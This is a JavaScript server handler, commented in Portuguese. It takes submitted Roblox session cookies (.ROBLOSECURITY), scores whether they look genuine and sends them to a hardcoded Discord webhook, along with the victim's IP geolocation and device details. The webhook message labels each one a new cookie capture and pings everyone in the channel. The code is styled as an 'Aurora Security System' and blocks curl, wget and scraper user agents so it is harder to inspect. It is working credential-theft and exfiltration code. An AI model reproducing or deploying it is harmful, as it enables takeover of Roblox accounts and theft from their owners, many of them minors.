// Importar módulos de segurança
import fs from 'fs';
import path from 'path';

const BANNED_IPS_FILE = path.join(process.cwd(), 'banned-ips.json');
const RATE_LIMIT_FILE = path.join(process.cwd(), 'rate-limit.json');

// Cache para rate limiting
const rateLimit = new Map();

// Lista de User-Agents proibidos
const blockedUserAgents = [
  'bot', 'crawler', 'spider', 'scrapy', 'curl', 'wget',
  'python', 'java', 'go-http-client', 'php', 'ruby',
  'postman', 'insomnia', 'httpie', 'axios', 'node-fetch'
];

// 🔥 VALIDAÇÃO DE COOKIES 🔥
function validateCookie(cookie) {
  const validation = {
    valid: false,
    length: cookie.length,
    hasWarning: false,
    hasRoblosecurity: false,
    format: 'desconhecido',
    score: 0,
    errors: []
  };

  // Verificar comprimento mínimo
  if (cookie.length < 50) {
    validation.errors.push('Cookie muito curto');
  } else {
    validation.score += 2;
  }

  // Verificar formato Roblox
  if (cookie.includes('_|WARNING:-DO-NOT-SHARE-')) {
    validation.hasWarning = true;
    validation.format = 'roblox_com_warning';
    validation.score += 3;
  } 
  else if (cookie.includes('RBXID') || cookie.includes('\.ROBLOSECURITY')) {
    validation.hasRoblosecurity = true;
    validation.format = 'roblox_token';
    validation.score += 3;
  }
  else if (/^[A-Za-z0-9]+$/.test(cookie)) {
    validation.format = 'token_simples';
    validation.score += 1;
  }

  // Verificar caracteres válidos
  const validChars = /^[A-Za-z0-9_|.:\-=]+$/.test(cookie);
  if (!validChars) {
    validation.errors.push('Caracteres inválidos');
  } else {
    validation.score += 1;
  }

  // Verificar padrões suspeitos
  if (cookie.includes('undefined') || cookie.includes('null')) {
    validation.errors.push('Cookie contém undefined/null');
  }

  if (cookie.includes(' ')) {
    validation.errors.push('Cookie contém espaços');
  }

  // Verificar entropia (aleatoriedade)
  const uniqueChars = new Set(cookie).size;
  const entropy = uniqueChars / cookie.length;
  if (entropy < 0.3) {
    validation.errors.push('Baixa entropia (possível cookie falso)');
  } else {
    validation.score += 1;
  }

  // Verificar repetições suspeitas
  const repeats = (cookie.match(/(.)\1{4,}/g) || []).length;
  if (repeats > 0) {
    validation.errors.push('Muitas repetições');
  }

  // Verificar palavras comuns em cookies falsos
  const fakePatterns = ['test', 'fake', 'hack', 'exploit', 'cookie'];
  const hasFakePattern = fakePatterns.some(p => cookie.toLowerCase().includes(p));
  if (hasFakePattern) {
    validation.errors.push('Padrão de cookie falso detectado');
  }

  // Verificar se parece base64
  const isBase64 = /^[A-Za-z0-9+/]+=*$/.test(cookie) && cookie.length % 4 === 0;
  if (isBase64) {
    validation.format = 'base64';
    validation.score += 2;
  }

  // Verificar se parece hexadecimal
  const isHex = /^[0-9A-Fa-f]+$/.test(cookie);
  if (isHex) {
    validation.format = 'hexadecimal';
    validation.score += 1;
  }

  // Extrair partes importantes
  const parts = {
    full: cookie,
    prefix: cookie.substring(0, 30),
    suffix: cookie.substring(cookie.length - 30),
    roblosecurity: cookie.match(/\.ROBLOSECURITY=([^;\s]+)/)?.[1] || null,
    warning: cookie.match(/_\|WARNING:[^|]+\|([^|]+)/)?.[1] || null
  };

  // Pontuação final
  validation.valid = validation.score >= 5 && validation.errors.length === 0;
  validation.confidence = Math.min(100, Math.floor((validation.score / 10) * 100));
  validation.parts = parts;

  return validation;
}

// Verificar se IP está banido
function isIPBanned(ip) {
  try {
    if (fs.existsSync(BANNED_IPS_FILE)) {
      const data = fs.readFileSync(BANNED_IPS_FILE, 'utf8');
      const bannedData = JSON.parse(data);
      return bannedData.ips.some(item => item.ip === ip);
    }
  } catch (error) {
    console.error('Erro ao ler banned-ips.json:', error);
  }
  return false;
}

// Verificar rate limit
function checkRateLimit(ip) {
  const now = Date.now();
  const windowMs = 60000;
  const maxRequests = 5;

  if (!rateLimit.has(ip)) {
    rateLimit.set(ip, []);
  }

  const timestamps = rateLimit.get(ip).filter(t => now - t < windowMs);
  
  if (timestamps.length >= maxRequests) {
    return false;
  }

  timestamps.push(now);
  rateLimit.set(ip, timestamps);
  return true;
}

// Verificar User-Agent
function isValidUserAgent(userAgent) {
  if (!userAgent || userAgent.length < 10) return false;
  const ua = userAgent.toLowerCase();
  return !blockedUserAgents.some(bot => ua.includes(bot));
}

export default async function handler(req, res) {
  // Headers de segurança
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { cookie, ip, device, timestamp } = req.body;
    const userAgent = req.headers['user-agent'] || '';

    // 1. Verificar IP banido
    if (isIPBanned(ip)) {
      console.log(`🚫 IP banido: ${ip}`);
      return res.status(403).json({ 
        error: 'IP banido',
        banned: true
      });
    }

    // 2. Rate limiting
    if (!checkRateLimit(ip)) {
      console.log(`⚠️ Rate limit: ${ip}`);
      return res.status(429).json({ 
        error: 'Muitas requisições',
        retryAfter: 60
      });
    }

    // 3. Verificar User-Agent
    if (!isValidUserAgent(userAgent)) {
      console.log(`🤖 Bot detectado: ${userAgent}`);
      return res.status(403).json({ 
        error: 'User-Agent não permitido'
      });
    }

    // 4. 🔥 VALIDAR COOKIE 🔥
    const validation = validateCookie(cookie);

    console.log(`📊 Validação do cookie:`, {
      ip,
      valid: validation.valid,
      confidence: validation.confidence,
      format: validation.format,
      errors: validation.errors
    });

    // Se o cookie for inválido, ainda envia para o Discord mas marca como suspeito
    const isSuspicious = !validation.valid || validation.confidence < 50;

    // Buscar informações do IP
    let ipInfo = {};
    try {
      const ipResponse = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
      ipInfo = await ipResponse.json();
    } catch (e) {
      console.error('Erro ao buscar info do IP:', e);
    }

    // WEBHOOK DO DISCORD
    const webhookURL = 'https://canary.discord.com/api/webhooks/1477057706568323195/4545g7HNyqcjMCkJe2t95-djEoA-kuXgu-VY1u_zb6slpT3lpdmbwyxDl8urWU51Effi';

    // Criar embed com informações de validação
    const embed = {
      content: isSuspicious ? '⚠️ **COOKIE SUSPEITO DETECTADO**' : '@everyone',
      embeds: [{
        title: isSuspicious ? '⚠️ **COOKIE SUSPEITO**' : '🔐 **NOVA CAPTURA DE COOKIE**',
        description: isSuspicious ? 'Este cookie passou nas verificações com baixa confiança' : 'Um novo cookie foi capturado pelo sistema Aurora',
        color: isSuspicious ? 0xff4444 : 0x6366f1,
        fields: [
          {
            name: '🍪 **COOKIE**',
            value: '```' + cookie.substring(0, 100) + (cookie.length > 100 ? '...' : '') + '```'
          },
          {
            name: '🔍 **VALIDAÇÃO**',
            value: `\`\`\`yml
Válido: ${validation.valid ? '✅' : '❌'}
Confiança: ${validation.confidence}%
Formato: ${validation.format}
Tamanho: ${validation.length} caracteres
Erros: ${validation.errors.length || 'Nenhum'}
\`\`\``
          },
          {
            name: '📊 **INFORMAÇÕES DO DISPOSITIVO**',
            value: `\`\`\`yml
Dispositivo: ${device}
Navegador: ${getBrowserInfo(req)}
Sistema: ${getOSInfo(req)}
Idioma: ${req.headers['accept-language'] || 'Desconhecido'}
\`\`\``
          },
          {
            name: '🌍 **INFORMAÇÕES DO IP**',
            value: `\`\`\`yml
IP: ${ip}
País: ${ipInfo.country || 'Desconhecido'} ${ipInfo.countryCode || ''}
Região: ${ipInfo.regionName || 'Desconhecido'}
Cidade: ${ipInfo.city || 'Desconhecido'}
ISP: ${ipInfo.isp || 'Desconhecido'}
Proxy/VPN: ${ipInfo.proxy ? 'Sim' : 'Não'}
\`\`\``
          },
          {
            name: '⏰ **TIMESTAMP**',
            value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
            inline: true
          },
          {
            name: '🔢 **ID DA SESSÃO**',
            value: `\`${generateSessionId()}\``,
            inline: true
          },
          {
            name: '📏 **PREFIXO DO COOKIE**',
            value: '`' + (validation.parts.prefix || 'N/A') + '`',
            inline: true
          }
        ],
        footer: {
          text: isSuspicious ? 'Aurora Security • Cookie Suspeito' : 'Aurora Security System',
          icon_url: 'https://media.discordapp.net/attachments/1478076459074719877/1478567053999869993/Gemini_Generated_Image_17qz9117qz9117qz.png'
        },
        timestamp: new Date().toISOString()
      }]
    };

    // Adicionar erros se houver
    if (validation.errors.length > 0) {
      embed.embeds[0].fields.push({
        name: '❌ **ERROS DETECTADOS**',
        value: validation.errors.map(e => `• ${e}`).join('\n')
      });
    }

    // Enviar para o Discord
    const response = await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });

    if (!response.ok) {
      throw new Error('Falha ao enviar para Discord');
    }

    // Retornar resultado da validação
    return res.status(200).json({ 
      success: true,
      validation: {
        valid: validation.valid,
        confidence: validation.confidence,
        format: validation.format,
        suspicious: isSuspicious
      }
    });
    
  } catch (error) {
    console.error('Erro:', error);
    return res.status(500).json({ error: 'Erro interno' });
  }
}

// Funções auxiliares
function getBrowserInfo(req) {
  const ua = req.headers['user-agent'] || '';
  if (ua.includes('Chrome')) return 'Google Chrome';
  if (ua.includes('Firefox')) return 'Mozilla Firefox';
  if (ua.includes('Safari')) return 'Apple Safari';
  if (ua.includes('Edge')) return 'Microsoft Edge';
  if (ua.includes('Opera')) return 'Opera';
  return 'Desconhecido';
}

function getOSInfo(req) {
  const ua = req.headers['user-agent'] || '';
  if (ua.includes('Windows')) return 'Windows';
  if (ua.includes('Mac OS')) return 'macOS';
  if (ua.includes('Linux')) return 'Linux';
  if (ua.includes('Android')) return 'Android';
  if (ua.includes('iOS')) return 'iOS';
  return 'Desconhecido';
}

function generateSessionId() {
  return Math.random().toString(36).substring(2, 15) + 
         Math.random().toString(36).substring(2, 15);
}